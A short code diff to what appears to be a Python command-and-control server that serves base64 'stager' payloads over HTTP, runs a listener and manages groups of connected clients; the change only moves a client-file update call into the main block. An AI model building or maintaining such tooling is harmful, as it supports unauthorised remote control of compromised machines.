@@ -6,7 +6,7 @@ import json
 import os
 import logging
 import urllib.request
-import base64 # import for b64 encoding for the b64 stager
+import base64  # import for b64 encoding for the b64 stager
 
 # Correct path to configuration file
 config_path = os.path.join(os.path.dirname(__file__), 'config', 'config.json')
@@ -128,9 +128,7 @@ def update_client_file():
         except Exception as e:
             print(f"[!] Error processing file {file_path}: {e}")
 
-
 def start_http_server():
-    update_client_file()  # Update the client file before serving
     payload_path = os.path.join(os.path.dirname(__file__), 'Stagers', PAYLOAD_FILENAME)
     if not os.path.isfile(payload_path):
         print(f"[!] Payload file not found: {payload_path}")
@@ -230,6 +228,9 @@ def interact_with_client_group():
         print(f"[!] No group with name: {group_name}")
 
 if __name__ == "__main__":
+    # Update client files before starting the servers
+    update_client_file()
+
     listener_thread = threading.Thread(target=start_listener)
     listener_thread.daemon = True
     listener_thread.start()
